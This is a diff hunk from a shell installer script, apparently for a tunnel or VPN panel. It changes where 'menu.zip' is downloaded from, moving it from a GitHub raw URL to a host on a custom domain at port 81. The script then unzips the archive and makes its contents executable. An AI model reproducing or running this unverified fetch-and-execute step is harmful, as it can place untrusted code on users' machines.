@@ -35,7 +35,7 @@ fun_bar() {
     tput cnorm
 }
 res1() {
-    wget https://raw.githubusercontent.com/altunnel/v4/main/limit/menu.zip
+    wget https://scriptcjxrq91ay.agung-store.my.id:81/limit/menu.zip
     unzip menu.zip
     chmod +x menu/*
     enc menu/*
